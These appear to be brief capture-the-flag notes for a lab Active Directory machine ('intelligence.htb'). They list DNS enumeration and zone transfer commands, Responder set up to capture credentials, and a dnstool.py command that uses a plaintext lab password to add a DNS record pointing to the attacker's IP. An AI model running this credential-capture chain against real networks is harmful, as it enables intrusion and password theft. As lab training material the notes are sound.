```
dig @10.10.10.248 intelligence.htb
```
- query 

```
dig axfr @10.10.10.248 intelligence.htb
```
- zone transfer

```
dnsenum --dnsserver 10.10.10.248 -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -o scans/dnsenum-bitquark-intelligence.htb intelligence.htb dnsenum VERSION:1.2.6
```
- enumerate subdomains
- make sure to add to `/etc/hosts`

***Add DNS record (in box was used bc script was found that auth's with web server's found that start with "web" so created web server)***
`sudo responder -I tun0`
- capture creds from auth
```
python3 dnstool.py -u intelligence\\Tiffany.Molina -p NewIntelligenceCorpUser9876 --action add --record web-0xdf --data 10.10.14.172 --type A intelligence.htb
```
- adds a new LDAP record, which points to my tun0 IP